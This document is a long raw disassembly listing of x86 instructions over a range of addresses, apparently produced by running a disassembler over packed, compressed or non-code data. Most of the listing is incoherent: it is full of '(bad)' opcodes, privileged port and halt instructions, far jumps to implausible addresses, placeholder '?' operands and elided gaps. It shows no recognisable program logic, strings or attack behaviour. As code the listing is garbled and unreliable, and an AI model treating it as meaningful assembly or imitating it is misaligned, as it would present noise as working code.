  405de2:	xlat   BYTE PTR cs:[ebx]
  405de4:	popf   
  405de5:	or     eax,0xb056051
  405dea:	sub    DWORD PTR [ebx+edi*8-0x74],ebp
  405dee:	jl     0x405da0
  405df0:	(bad)  
  405df1:	dec    DWORD PTR [esi]
	...
  405dff:	add    BYTE PTR [eax],al
  405e01:	add    BYTE PTR [edx-0x6ff2f72],dl
  405e07:	std    
  405e08:	fidiv  DWORD PTR [ebp-0x32]
  405e0b:	xchg   DWORD PTR [ebp-0x8d52d0],eax
  405e11:	push   eax
  405e12:	bound  esi,QWORD PTR [edi-0xf45ff59]
  405e18:	and    ecx,DWORD PTR [ebp-0x146f9]
  405e1e:	lods   eax,DWORD PTR ds:[esi]
  405e1f:	fsin   
  405e21:	jne    0x405da5
  405e23:	push   0x45
  405e25:	rcr    DWORD PTR [ebp-0x418a008e],cl
  405e2b:	jb     0x405ea2
  405e2d:	or     BYTE PTR [edx-0x42002c80],ah
  405e33:	rcr    BYTE PTR [edx-0x37],cl
  405e36:	mov    eax,0xd154fffd
  405e3b:	gs add esp,0xffff69e2
  405e42:	scas   eax,DWORD PTR es:[edi]
  405e43:	cmp    al,0xfc
  405e45:	push   eax
  405e46:	fucomp st(3)
  405e48:	or     edi,edi
  405e4a:	test   esp,0x6a4a4128
  405e50:	mov    edx,0xb023aa8
  405e55:	shr    BYTE PTR ds:0xa00e77d,0x2
  405e5c:	mov    DWORD PTR [ebp-0x4e],0xfa000009
  405e63:	mov    edx,0xf445
	...
  405e74:	add    BYTE PTR [ebp+0x10fffffa],bl
  405e7a:	add    ch,BYTE PTR [edx+0x0]
  405e7d:	jg     0x405efb
  405e7f:	in     al,dx
  405e80:	idiv   DWORD PTR ds:0xfa6a5072
  405e86:	test   BYTE PTR [ebp-0xc],al
  405e89:	sbb    al,BYTE PTR [ebp-0x109c0b7b]
  405e8f:	xchg   edx,eax
  405e90:	push   DWORD PTR [ebx]
  405e92:	call   FWORD PTR [eax]
  405e94:	clc    
  405e95:	les    edx,FWORD PTR [eax]
  405e97:	(bad)
  405e9b:	add    al,0x0
  405e9d:	push   0xba0517dc
  405ea2:	dec    eax
  405ea3:	add    al,0x0
  405ea5:	arpl   WORD PTR [ebx],bx
  405ea7:	push   eax
  405ea8:	in     al,dx
  405ea9:	xchg   esp,eax
  405eaa:	scas   al,BYTE PTR es:[edi]
  405eab:	xchg   edx,eax
  405eac:	add    DWORD PTR [edi],ecx
  405eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eaf:	xchg   BYTE PTR [ebp-0x6d4981],bh
  405eb5:	pop    esp
  405eb6:	ror    BYTE PTR [eax],1
  405eb8:	jmp    DWORD PTR [esi]
  405eba:	les    ebx,FWORD PTR [esi-0x2c4df44a]
  405ec0:	inc    eax
  405ec1:	arpl   WORD PTR [ecx],si
  405ec3:	mov    ah,dh
  405ec5:	ins    BYTE PTR es:[edi],dx
  405ec6:	xchg   dx,ax
  405ec8:	push   eax
  405ec9:	dec    ebx
  405eca:	sbb    ebx,DWORD PTR [ebx+0x0]
  405ecd:	arpl   WORD PTR [edi+0x29d274c3],sp
  405ed3:	mov    al,ch
  405ed5:	dec    esp
  405ed6:	test   BYTE PTR [edx+0x50],dl
	...
  405ee8:	out    dx,al
  405ee9:	and    DWORD PTR [edi+0x331434f7],edx
  405eef:	push   DWORD PTR [esi-0x71ca6d56]
  405ef5:	cmc    
  405ef6:	inc    esp
  405ef7:	add    BYTE PTR [ebx],cl
  405ef9:	aaa    
  405efa:	stos   DWORD PTR es:[edi],eax
  405efb:	call   DWORD PTR [eax+ebp*4]
  405efe:	ret    
  405eff:	je     0x405eb3
  405f01:	and    eax,0x440cf088
  405f06:	xchg   edx,eax
  405f07:	push   0xbea29e62
  405f0c:	hlt    
  405f0d:	dec    ecx
  405f0e:	sti    
  405f0f:	out    0xa1,eax
  405f11:	lock xchg ecx,eax
  405f13:	jmp    eax
  405f15:	add    eax,0x8cd49f64
  405f1a:	push   ds
  405f1b:	add    al,0x4e
  405f1d:	stc    
  405f1e:	add    BYTE PTR [ebx],0xcc
  405f21:	adc    ah,cl
  405f23:	fwait
  405f24:	je     0x405edd
  405f26:	push   es
  405f27:	xchg   edx,eax
  405f28:	enter  0x92ff,0x4
  405f2c:	mov    ah,0x12
  405f2e:	loope  0x405ecb
  405f30:	xor    BYTE PTR [edi+0x52a491ee],0xd1
  405f37:	cdq    
  405f38:	pushf  
  405f39:	mov    esi,ds
  405f3b:	push   edi
  405f3c:	xchg   ebx,eax
  405f3d:	xchg   esp,eax
  405f3e:	(bad)  
  405f3f:	xchg   ecx,eax
  405f40:	mov    WORD PTR [edx],ss
  405f42:	loope  0x405edf
  405f44:	push   ds
  405f45:	mov    bh,0xc6
  405f47:	xchg   ecx,eax
  405f48:	jl     0x405f9c
  405f4a:	mov    ecx,0x99
	...
  405f5b:	je     0x405ee9
  405f5d:	ror    DWORD PTR ds:0x91ae8c96,0x1e
  405f64:	lea    edx,[eax-0x6173a224]
  405f6a:	xchg   ecx,eax
  405f6b:	into   
  405f6c:	mov    DWORD PTR [ecx-0x16fafb39],eax
  405f72:	mov    edx,0x36e8fd21
  405f77:	call   0x4008c814
  405f7c:	xchg   esp,eax
  405f7d:	jbe    0x405f10
  405f7f:	fiadd  WORD PTR [ecx+0x6d]
  405f82:	xor    al,0x24
  405f84:	adc    dh,ch
  405f86:	nop
  405f87:	push   esi
  405f88:	xor    dl,BYTE PTR [eax]
  405f8a:	inc    ebx
  405f8b:	arpl   WORD PTR [ebp+0x5636985],bx
  405f91:	loop   0x405f56
  405f93:	push   esp
  405f94:	sbb    BYTE PTR [edx+0x26056302],0x47
  405f9b:	sti    
  405f9c:	add    al,0x0
  405f9e:	jmp    0xa5076503
  405fa3:	int3   
  405fa4:	mov    eax,DWORD PTR [edi]
  405fa6:	jmp    0x93407f0b
  405fab:	pusha  
  405fac:	pop    ds
  405fad:	add    BYTE PTR [ebx+0x15457a60],al
  405fb3:	(bad)  
  405fb4:	jp     0x405f3b
  405fb6:	std    
  405fb7:	fisttp DWORD PTR [ebx+0x11d399ff]
  405fbd:	clc    
  405fbe:	test   BYTE PTR [eax],0x0
	...
  405fcd:	add    BYTE PTR [ebp-0x77],dl
  405fd0:	call   0x459b44
  405fd5:	repnz mov al,ds:0x9ad00510
  405fdb:	add    al,0x0
  405fdd:	jmp    0x2869234a
  405fe2:	pop    edi
  405fe3:	mov    WORD PTR [ebp-0xb],?
  405fe6:	fsub   DWORD PTR [ebp-0x28]
  405fe9:	mov    esi,0x998b34d3
  405fee:	in     eax,dx
  405fef:	xor    esp,0x508bd3b6
  405ff5:	cmp    edi,edi
  405ff7:	je     0x405fd1
  405ff9:	sahf   
  405ffa:	repz jl 0x405f82
  405ffd:	cdq    
  405ffe:	jmp    0x405f8a
  406000:	inc    DWORD PTR [ecx-0x79004e05]
  406006:	pop    esi
  406007:	add    eax,0x4610ea68
  40600c:	add    BYTE PTR [esi-0x6b],dh
  40600f:	xchg   ebp,eax
  406010:	imul   DWORD PTR [esi-0x2d]
  406013:	mov    dh,BYTE PTR ds:0x4639bc
  406019:	push   ecx
  40601a:	retf   
  40601b:	mov    dl,0xff
  40601d:	push   esi
  40601e:	mov    DWORD PTR [eax-0x750ca91c],eax
  406024:	push   0x0
  406026:	or     ch,bh
  406028:	or     esi,DWORD PTR [eax]
  40602a:	retf   
  40602b:	push   es
  40602c:	push   DWORD PTR [ebp-0x92d6]
	...
  40603e:	add    BYTE PTR [eax],al
  406040:	add    BYTE PTR ds:0xb2954b3,dh
  406046:	pop    es
  406047:	call   0xffb5ee15
  40604c:	mov    DWORD PTR [edi],edi
  40604e:	push   0xfffffff7
  406050:	call   DWORD PTR [ebp-0x18]
  406053:	jmp    DWORD PTR [edi-0x61]
  406056:	mov    dh,0x40
  406058:	add    BYTE PTR [ebp-0x4a080fd0],dh
  40605e:	jp     0x40605f
  406060:	xor    eax,0x40afcf
  406065:	mov    dl,0x2e
  406067:	xlat   BYTE PTR ds:[ebx]
  406068:	push   DWORD PTR [ebp-0x52177af8]
  40606e:	jp     0x40606f
  406070:	adc    edi,0x5d
  406073:	idiv   edi
  406075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406076:	add    DWORD PTR [ecx+ecx*2+0x9],esi
  40607a:	xor    al,0xec
  40607c:	div    DWORD PTR [ebp+0x3a74007a]
  406082:	xchg   BYTE PTR [ebp-0x860218],bh
  406088:	add    BYTE PTR [esi-0x4e],ch
  40608b:	add    BYTE PTR [bp+si],bh
  40608e:	imul   edi,DWORD PTR [esi-0x18769001],0xffffffee
  406095:	fidivr DWORD PTR [ecx-0x1]
  406098:	jmp    FWORD PTR [edi+0x65]
  40609b:	idiv   edi
  40609d:	mov    ch,0x7a
  40609f:	jne    0x4060a9
  4060a1:	loop   0x4060e9
  4060a3:	sar    edi,1
	...
  4060b1:	add    BYTE PTR [eax],al
  4060b3:	add    BYTE PTR [ebp-0x52174a86],al
  4060b9:	jp     0x4060ba
  4060bb:	jmp    DWORD PTR [ebx-0x57]
  4060be:	sti    
  4060bf:	out    0x4f,eax
  4060c1:	int    0x8e
  4060c3:	(bad)  
  4060c4:	cld    
  4060c5:	or     BYTE PTR [eax-0x71350b09],ch
  4060cb:	jne    0x406128
  4060cd:	inc    esp
  4060ce:	out    0xd0,al
  4060d0:	in     al,0xda
  4060d2:	mov    ?,WORD PTR [ebp-0x711539]
  4060d8:	retf   
  4060d9:	stos   DWORD PTR es:[edi],eax
  4060da:	mov    bh,0xff
  4060dc:	int3   
  4060dd:	repnz pop eax
  4060df:	in     al,dx
  4060e0:	int3   
  4060e1:	cli    
  4060e2:	mov    gs,eax
  4060e4:	xchg   al,ch
  4060e6:	mov    ?,edi
  4060e8:	mov    ah,0xd0
  4060ea:	fwait
  4060eb:	imul   DWORD PTR [edx+edx*4-0x6570e565]
  4060f2:	mov    ?,edi
  4060f4:	(bad)  
  4060f5:	stos   DWORD PTR es:[edi],eax
  4060f6:	xchg   esi,eax
  4060f7:	call   DWORD PTR [edx+ebp*4+0x787b0818]
  4060fe:	(bad)  
  4060ff:	inc    DWORD PTR [edx+edi*4-0x3d8b0fa8]
  406106:	mov    gs,eax
  406108:	bound  esi,QWORD PTR [eax-0x72]
  40610b:	jmp    FWORD PTR [eax+ebx*8-0x75]
  40610f:	jmp    0xffcebabb
  406114:	pop    esp
  406115:	jmp    0x0:0xe88f
	...
  406124:	add    BYTE PTR [eax],al
  406126:	add    BYTE PTR [eax+0x1a000340],ch
  40612c:	pop    ebp
  40612d:	sti    
  40612e:	jmp    FWORD PTR [edi+0x27839f23]
  406134:	sbb    DWORD PTR [ecx],0x0
  406137:	leave  
  406138:	popf   
  406139:	mov    ?,WORD PTR [ebp+0x5b]
  40613c:	xchg   dl,dh
  40613e:	shl    BYTE PTR [eax+ebx*1],1
  406141:	jl     0x406188
  406143:	pop    ds
  406144:	push   es
  406145:	rcl    DWORD PTR [edx],1
  406147:	inc    esp
  406148:	inc    esi
  406149:	jmp    0x413df7dc
  40614e:	daa    
  40614f:	add    eax,0xd11b4e89
  406154:	fsub   DWORD PTR [edi-0xeed0bfd]
  40615a:	fwait
  40615b:	xchg   esp,eax
  40615c:	xchg   DWORD PTR [esi],esi
  40615e:	mov    ?,WORD PTR [ebx+0x53]
  406161:	inc    BYTE PTR [ebx+eiz*2-0x78]
  406165:	pushf  
  406166:	sti    
  406167:	mov    esp,0xcc8e1bc9
  40616c:	sbb    eax,0x523de33
  406171:	push   cs
  406172:	sbb    BYTE PTR [ebx-0x63],ch
  406175:	(bad)  
  406176:	nop
  406177:	mov    ah,0x88
  406179:	(bad)  
  40617a:	pop    ss
  40617b:	scas   eax,DWORD PTR es:[edi]
  40617c:	mov    BYTE PTR [ebx+edi*8-0x44],bh
  406180:	lock pop ss
  406182:	mov    ds,WORD PTR [esi+edi*4+0x326308ab]
  406189:	jb     0x40612b
	...
  406197:	add    BYTE PTR [eax],al
  406199:	add    bl,bh
  40619b:	add    al,0xe9
  40619d:	pushf  
  40619e:	lds    ecx,FWORD PTR [eax+0x127c0054]
  4061a4:	icebp  
  4061a5:	fwait
  4061a6:	pop    es
  4061a7:	xchg   edx,eax
  4061a8:	mov    esi,0xe1c39a8d
  4061ad:	add    ecx,DWORD PTR [esi]
  4061af:	jl     0x40616e
  4061b1:	sbb    esi,0xe0fce8f9
  4061b7:	loop   0x4061a0
  4061b9:	add    esp,DWORD PTR [ebx-0x78]
  4061bc:	sbb    al,0x0
  4061be:	cmp    ebp,DWORD PTR [ebx]
  4061c0:	scas   eax,DWORD PTR es:[edi]
  4061c1:	lea    edi,[esp+edi*8]
  4061c4:	test   al,0x17
  4061c6:	push   ebx
  4061c7:	sbb    eax,0x5a3dca7
  4061cc:	add    BYTE PTR [esi+0x4c],dh
  4061cf:	stc    
  4061d0:	out    0x22,eax
  4061d2:	(bad)  
  4061d3:	xchg   edi,edi
  4061d5:	jo     0x406173
  4061d7:	stc    
  4061d8:	imul   ebp,ecx,0xa82fc868
  4061de:	pusha  
  4061df:	sbb    eax,0x5a0194a
  4061e4:	(bad)  
  4061e5:	cld    
  4061e6:	sub    eax,0xc8e940de
  4061eb:	cs (bad) 
  4061ed:	ss (bad) 
  4061ef:	sti    
  4061f0:	mov    edi,0x5037ceb5
  4061f5:	es ins BYTE PTR es:[edi],dx
  4061f7:	stc    
  4061f8:	out    0x2e,eax
  4061fa:	adc    eax,0xb9ff88
	...
  40620b:	add    BYTE PTR [eax],al
  40620d:	nop
  40620e:	mov    BYTE PTR [ebp-0x1f],dh
  406211:	fdiv   DWORD PTR [ebp-0x1]
  406214:	push   es
  406215:	out    0x9c,al
  406217:	and    DWORD PTR [edx],ebx
  406219:	fiadd  WORD PTR [edi-0x780c2a18]
  40621f:	inc    DWORD PTR [ebx+0x193f1d60]
  406225:	and    BYTE PTR ds:0x44b73368,al
  40622b:	add    BYTE PTR [ecx+0x61],al
  40622e:	add    eax,0xe6d86900
  406233:	aad    0xc6
  406235:	out    0xfb,eax
  406237:	mov    edi,0x50377d35
  40623c:	mov    dh,0x4d
  40623e:	stc    
  40623f:	out    0x56,eax
  406241:	push   ss
  406242:	xchg   edi,edi
  406244:	cmp    DWORD PTR [edi-0x170e8a7a],ecx
  40624a:	sub    al,0xff
  40624c:	xchg   esi,eax
  40624d:	xlat   BYTE PTR ds:[ebx]
  40624e:	popf   
  40624f:	jmp    0xe8c7520f
  406254:	add    dh,ah
  406256:	push   esp
  406257:	(bad)  
  406258:	call   DWORD PTR [eax+0x1]
  40625b:	push   0x43ea3f
  406260:	push   0x40b31f
  406265:	jge    0x406216
  406267:	push   esp
  406268:	sub    DWORD PTR [ebx+0x47e5e802],edi
  40626e:	jns    0x40626f
  406270:	or     eax,DWORD PTR [eax]
	...
  40627e:	add    BYTE PTR [eax],al
  406280:	dec    edx
  406281:	out    dx,al
  406282:	sbb    eax,0x7579da50
  406287:	or     al,0x92
  406289:	fcom   st(5)
  40628b:	jmp    FWORD PTR ds:0x17ff4fd2
  406291:	mov    esp,edi
  406293:	and    BYTE PTR [ebp+0x79],bh
  406296:	(bad)  
  406297:	call   0x3fb6c6
  40629c:	bound  ebp,QWORD PTR ds:0xec6dffd2
  4062a2:	jmp    DWORD PTR [edi-0x63]
  4062a5:	mov    dl,0x40
  4062a7:	add    dl,dl
  4062a9:	out    0x2f,eax
  4062ab:	inc    ecx
  4062ac:	mov    edx,0x8a0001ea
  4062b1:	sub    al,0xad
  4062b4:	xlat   BYTE PTR ds:[ebx]
  4062b5:	jp     0x4062b6
  4062b7:	or     edi,DWORD PTR [edx+0x4a501df5]
  4062bd:	jp     0x406334
  4062bf:	or     al,0xa2
  4062c1:	mov    ds:0xd19dffd5,eax
  4062c6:	dec    edi
  4062c7:	push   DWORD PTR [edi]
  4062c9:	mov    edi,esp
  4062cb:	call   0xe93fdd7c
  4062d0:	xchg   edx,eax
  4062d1:	dec    edi
  4062d2:	(bad)  
  4062d3:	push   edx
  4062d5:	in     eax,dx
  4062d6:	sar    edi,1
  4062d8:	in     eax,dx
  4062d9:	call   0xdda392fc
  4062de:	add    edi,edi
  4062e0:	mov    dh,0xa8
  4062e2:	fwait
  4062e3:	add    eax,0x0
	...
  4062f0:	add    BYTE PTR [eax],al
  4062f2:	add    BYTE PTR ds:0x93508b7f,cl
  4062f8:	pop    es
  4062f9:	adc    DWORD PTR [eax],ecx
  4062fb:	cmp    edx,DWORD PTR [edi-0x76]
  4062fe:	call   FWORD PTR [esp+eax*4]
  406301:	xor    edx,edx
  406303:	adc    al,0x1f
  406305:	mov    esi,DWORD PTR [ebp+0x5f]
  406308:	xor    al,0x3b
  40630a:	rol    BYTE PTR [edi+ebp*1],cl
  40630d:	mov    ebp,0x309c6bc2
  406312:	mov    eax,DWORD PTR [edi]
  406314:	sbb    eax,eax
  406316:	hlt    
  406317:	jns    0x4062b5
  406319:	sbb    eax,0xfb48e402
  40631e:	out    0x52,eax
  406320:	out    0x8a,eax
  406322:	(bad)  
  406323:	jmp    0x39d:0x66688758
  40632a:	add    BYTE PTR [ebx-0x43004aa6],bh
  406330:	and    al,0x41
  406332:	clc    
  406333:	dec    ebx
  406334:	cwde   
  406335:	add    al,0x0
  406337:	arpl   WORD PTR [edi-0x1c4407f0],ax
  40633d:	data16 add BYTE PTR [ebx-0x5d],ah
  406341:	ret    
  406342:	je     0x4063b3
  406344:	loope  0x406345
  406346:	add    BYTE PTR [ebx-0x64],ah
  406349:	adc    cl,BYTE PTR ds:0xff8c2884
  40634f:	mul    BYTE PTR [ebx-0x418a7765]
  406355:	mov    ch,bl
	...
  406363:	add    BYTE PTR [eax],al
  406365:	add    BYTE PTR [ebx+0x47],bl
  406368:	adc    al,bh
  40636a:	jnp    0x4063bb
  40636c:	mov    ah,0xff
  40636e:	pop    esp
  40636f:	leave  
  406370:	(bad)  
  406372:	lahf   
  406373:	add    eax,0xd64c8abf
  406378:	popf   
  406379:	adc    BYTE PTR [ebx+0x6d],bl
  40637c:	pop    es
  40637d:	mov    bh,BYTE PTR [eax*4+0x3a3cee03]
  406384:	lahf   
  406385:	mov    ch,BYTE PTR [ecx+edx*1]
  406388:	test   eax,0xc1ed4f0f
  40638d:	shl    DWORD PTR [ebx+0x2a9c1905],cl
  406393:	pop    ebx
  406394:	data16 mov dh,BYTE PTR [ebx-0x3042b7c]
  40639b:	aam    0x56
  40639d:	mov    bh,ah
  40639f:	out    dx,eax
  4063a0:	or     DWORD PTR [esi+ecx*2+0x588a465b],ebx
  4063a7:	inc    ebp
  4063a8:	mov    ch,0xef
  4063aa:	jl     0x4063dc
  4063ac:	stc    
  4063ad:	inc    esp
  4063ae:	arpl   bp,dx
  4063b0:	inc    eax
  4063b1:	pop    ebp
  4063b2:	scas   al,BYTE PTR es:[edi]
  4063b3:	test   BYTE PTR [esi],ah
  4063b5:	xor    ecx,esp
  4063b7:	cli    
  4063b8:	lock fwait
  4063ba:	xchg   ebx,eax
  4063bb:	adc    DWORD PTR [esi],0xffffff8a
  4063be:	dec    ecx
  4063bf:	and    DWORD PTR [ecx],eax
  4063c1:	xchg   ecx,eax
  4063c2:	mov    es,WORD PTR [esi+eax*1-0x2b061302]
  4063c9:	sbb    eax,DWORD PTR [eax]
	...
  4063d7:	add    BYTE PTR [eax],al
  4063d9:	js     0x406410
  4063db:	test   al,0x3
  4063dd:	xor    ebp,DWORD PTR [ebp+0x62]
  4063e0:	mov    al,0x94
  4063e2:	test   BYTE PTR [ecx],bh
  4063e4:	mov    DWORD PTR [esi],edx
  4063e6:	or     eax,0x8486f3d1
  4063eb:	(bad)  
  4063ec:	push   ds
  4063ed:	arpl   bp,bp
  4063ef:	adc    al,0xd4
  4063f1:	and    eax,DWORD PTR ds:0xc6333e51
  4063f7:	call   0x1a9284
  4063fc:	jmp    DWORD PTR [eax+0x1359e805]
  406402:	test   bh,bh
  406404:	cmp    edx,ebx
  406406:	stc    
  406407:	pop    es
  406408:	xchg   ecx,eax
  406409:	lock cmp edi,0x68055d96
  406410:	into   
  406411:	adc    ch,al
  406413:	call   DWORD PTR [eax]
  406415:	ins    DWORD PTR es:[edi],dx
  406416:	xor    eax,0x39dbe941
  40641b:	push   ebp
  40641c:	shl    BYTE PTR [ecx-0x3b0617fb],0x83
  406423:	push   edx
  406425:	and    cl,bh
  406427:	adc    eax,0xff794470
  40642c:	fsub   st(4),st
  40642e:	xor    DWORD PTR [ebp-0x1f],0xffffffd8
  406432:	mov    ch,0xfd
  406434:	inc    esi
  406435:	fiadd  DWORD PTR [ebx+0x42c73575]
  40643b:	shl    DWORD PTR [esi],1
	...
  406449:	add    BYTE PTR [eax],al
  40644b:	add    dl,ch
  40644d:	out    dx,al
  40644e:	inc    eax
  406450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406451:	xor    eax,DWORD PTR [ecx-0x17]
  406454:	push   0x60a82ff2
  406459:	test   BYTE PTR ds:0xffc499bc,dh
  40645f:	add    BYTE PTR [edx+0x7706ff57],ch
  406465:	test   BYTE PTR [ebp-0xf],dh
  406468:	enter  0xfda4,0xf6
  40646c:	jmp    0x40645c
  40646e:	inc    DWORD PTR [eax-0x16becc55]
  406474:	push   0x5f282ff2
  406479:	test   BYTE PTR ds:0xffc4983c,dh
  40647f:	ror    BYTE PTR [ebx-0x5aff00a9],0x80
  406486:	mov    edi,0x44fe8c74
  40648b:	hlt    
  40648c:	adc    eax,0x8ffff414
  406491:	and    edi,0xff8e0760
  406497:	jmp    FWORD PTR [edi-0x6b]
  40649a:	call   0xffce5f8c
  40649f:	push   0x4a
  4064a1:	pop    ds
  4064a2:	xor    al,0x30
  4064a4:	jnp    0x4064af
  4064a6:	push   0xffc7ea4a
  4064ab:	or     BYTE PTR [bx],al
  4064ae:	add    BYTE PTR [eax+0x0],al
	...
  4064bc:	add    BYTE PTR [eax],al
  4064be:	add    dl,ah
  4064c0:	popf   
  4064c1:	sar    edi,cl
  4064c3:	test   DWORD PTR [esi],esi
  4064c5:	push   DWORD PTR [ebp+0x12]
  4064c8:	lahf   
  4064c9:	push   eax
  4064ca:	std    
  4064cb:	xchg   ebp,eax
  4064cc:	lea    ebp,[edx+0x0]
  4064cf:	and    cl,BYTE PTR [esi+0x2f]
  4064d2:	inc    ecx
  4064d3:	cli    
  4064d4:	push   ds
  4064d5:	dec    edx
  4064d6:	xor    BYTE PTR [ebx-0x35fd97fa],bh
  4064dc:	push   es
  4064dd:	sub    al,0x7a
  4064e0:	mov    ecx,0x46d1ffff
  4064e5:	je     0x4064fd
  4064e7:	push   ebx
  4064e8:	inc    ebx
  4064e9:	hlt    
  4064ea:	(bad)  
  4064eb:	fist   WORD PTR [edx-0x613d8a01]
  4064f1:	adc    ebp,edi
  4064f3:	gs (bad) 
  4064f5:	push   DWORD PTR [ebp-0x52]
  4064f8:	lahf   
  4064f9:	sahf   
  4064fa:	rcl    BYTE PTR [ebp-0x1dff9576],1
  406500:	push   edx
  406501:	das    
  406502:	inc    ecx
  406503:	jp     0x406523
  406505:	ins    DWORD PTR es:[edi],dx
  406506:	xor    BYTE PTR [ebx],bh
  406508:	or     DWORD PTR [eax+0x2],ebp
  40650b:	arpl   WORD PTR [ebx+eax*1-0x80],bp
  40650f:	mov    ecx,DWORD PTR [ebx+esi*4-0x78e39301]
  406516:	jne    0x406573
  406518:	push   esp
  406519:	add    eax,0x1abb5cfd
  40651e:	add    bl,cl
  406520:	jae    0x4064f5
  406522:	inc    eax
	...
  40652f:	add    BYTE PTR [eax],al
  406531:	add    BYTE PTR [ebx+0x14],ah
  406534:	sbb    DWORD PTR [eax],esi
  406536:	mov    ds:0x63021b6c,al
  40653b:	ins    BYTE PTR es:[edi],dx
  40653c:	sub    eax,0xffffffe2
  40653f:	mov    esi,0xac58ff87
  406544:	adc    BYTE PTR [esi],dl
  406546:	fisubr DWORD PTR [eax]
  406548:	nop
  406549:	call   DWORD PTR [esi+0x6b758700]
  40654f:	test   dl,al
  406551:	cld    
  406552:	or     al,0xeb
  406554:	xchg   BYTE PTR [ebp+0xf],dh
  406557:	aam    0x36
  406559:	sar    ah,1
  40655b:	fiadd  DWORD PTR [esi+0x10d2f775]
  406561:	or     bl,bh
  406563:	sub    eax,0x34e4ffb9
  406568:	ret    0x6304
  40656b:	mov    eax,ds:0x6c4bec7a
  406570:	add    ebp,edi
  406572:	or     eax,0xc40c112b
  406577:	cwde   
  406578:	sti    
  406579:	out    0x54,eax
  40657b:	push   ds
  40657c:	xchg   edi,edi
  40657e:	stos   BYTE PTR es:[edi],al
  40657f:	sub    eax,0xf717fffc
  406584:	xchg   edi,eax
  406585:	sbb    DWORD PTR [edi-0x630079c9],0x95b88132
  40658f:	jb     0x406517
  406591:	add    BYTE PTR [ebx+0x5],ah
  406594:	jmp    0x40659c
	...
  4065a5:	fadd   st,st(7)
  4065a7:	in     al,dx
  4065a8:	cli    
  4065a9:	mov    esp,0x3b83ebf8
  4065ae:	add    eax,0xdb7a0154
  4065b3:	out    0x3,eax
  4065b5:	arpl   WORD PTR [edx+0x7044f834],ax
  4065bb:	xchg   ebx,eax
  4065bc:	xchg   BYTE PTR [ebp+ecx*1-0x57],dl
  4065c0:	adc    BYTE PTR [ebp+ebp*8+0x5d],bl
  4065c4:	xlat   BYTE PTR ds:[ebx]
  4065c5:	mov    ds:0x6f109e05,eax
  4065ca:	ins    DWORD PTR es:[edi],dx
  4065cb:	bound  esi,QWORD PTR [edx-0x77d7ecc]
  4065d1:	(bad)
  4065d5:	arpl   WORD PTR [eax+0x204f7f4],ax
  4065db:	call   0xd4b:0x648f1486
  4065e2:	and    DWORD PTR [esi+0x1b],0x3e90645
  4065e9:	out    dx,al
  4065ea:	mov    ch,BYTE PTR [ebx]
  4065ec:	test   esp,esi
  4065ee:	cmp    BYTE PTR [ecx+0x4650f79b],0x86
  4065f5:	(bad)  
  4065f6:	mov    ch,BYTE PTR [ebx]
  4065f8:	test   esp,ebx
  4065fa:	sbb    BYTE PTR [ecx+0x2fbe0e86],0x86
  406601:	int3   
  406602:	ins    DWORD PTR es:[edi],dx
  406603:	fldenv [ebx+eiz*2+0x5]
  406607:	jo     0x406589
	...
  406615:	add    BYTE PTR [eax],al
  406617:	add    bh,bh
  406619:	jg     0x406631
  40661b:	xchg   BYTE PTR [ebx],ah
  40661d:	adc    BYTE PTR [ebp-0x76],ah
  406620:	arpl   WORD PTR ds:0x43ce78e9,ax
  406626:	inc    DWORD PTR [ebp-0x14ff8764]
  40662c:	nop
  40662d:	cmp    bh,0xe9
  406630:	pop    esp
  406631:	jmp    0x9b67:0xd0ab2b8c
  406638:	fwait
  406639:	(bad)  
  40663c:	ins    BYTE PTR es:[edi],dx
  40663d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40663e:	add    cl,ch
  406640:	imul   eax,eax,0x75
  406643:	in     al,dx
  406644:	leave  
  406645:	mov    dh,0x0
  406647:	jmp    0xabd5f8ac
  40664c:	fnstsw WORD PTR [edi-0x1]
  40664f:	pop    esp
  406650:	mov    eax,ds:0xb3115031
  406655:	xor    DWORD PTR [ecx-0x17],eax
  406658:	fdiv   DWORD PTR [eax+eiz*4-0x17]
  40665c:	pusha  
  40665d:	or     al,0xc0
  40665f:	adc    al,0x2c
  406661:	ins    DWORD PTR es:[edi],dx
  406662:	xchg   esp,eax
  406663:	jmp    0xa7a86bc8
  406668:	aas    
  406669:	(bad)  
  40666c:	fs adc eax,ebp
  40666f:	jbe    0x406642
  406671:	jg     0x406672
  406673:	je     0x4066e9
  406675:	inc    ebx
  406676:	(bad)  
  406677:	pop    esi
  406678:	out    0x91,al
  40667a:	push   edx
  40667b:	add    eax,0x0
	...
  406688:	add    BYTE PTR [eax],al
  40668a:	add    BYTE PTR [ecx],dh
  40668c:	aad    0xe7
  40668e:	adc    dh,BYTE PTR [edx-0x20660081]
  406694:	stc    
  406695:	setns  bh
  406698:	stc    
  406699:	pop    es
  40669a:	inc    ecx
  40669b:	sar    DWORD PTR [esi-0x1],1
  40669e:	cs out dx,eax
  4066a0:	ss iret 
  4066a2:	fisubr WORD PTR es:[ebx+0x63]
  4066a6:	ins    BYTE PTR es:[edi],dx
  4066a7:	and    DWORD PTR [ecx],esi
  4066a9:	mov    DWORD PTR [ebx+edx*1+0x7f],ebp
  4066ad:	dec    DWORD PTR [esi]
  4066af:	dec    edi
  4066b0:	mov    esi,0x3fb0030
  4066b5:	push   DWORD PTR [ebp-0x78aa]
  4066bb:	(bad)  
  4066bd:	mov    al,ds:0xbf7c7a00
  4066c2:	je     0x4066f8
  4066c4:	and    esi,eax
  4066c6:	sub    BYTE PTR [ebx+0x9],cl
  4066c9:	push   DWORD PTR [ebp+0x7e]
  4066cc:	fwait
  4066cd:	test   eax,0xff889dd2
  4066d2:	mov    ch,0xe6
  4066d4:	mov    edi,edi
  4066d6:	(bad)  
  4066d7:	jp     0x40667a
  4066d9:	icebp  
  4066da:	ror    BYTE PTR ds:0xb950508a,cl
  4066e0:	pop    es
  4066e1:	adc    BYTE PTR [eax],al
  4066e3:	data16 jbe 0x40674d
  4066e6:	cwde   
  4066e7:	sbb    al,ah
  4066e9:	dec    DWORD PTR [edi-0x1e]
  4066ec:	add    DWORD PTR [ecx+0x0],esp
	...
  4066fe:	cmp    bl,BYTE PTR [esi+0x33bb805]
  406704:	add    BYTE PTR [eax],al
  406706:	inc    eax
  406707:	jl     0x4066c8
  406709:	je     0x40670e
  40670b:	xor    eax,0x9b0275ff
  406710:	xchg   esi,eax
  406711:	(bad)  
  406712:	jge    0x40669d
  406714:	call   0xffc9b3ea
  406719:	lea    eax,[edi-0x620001bc]
  40671f:	xor    bh,bh
  406721:	mov    ch,0xde
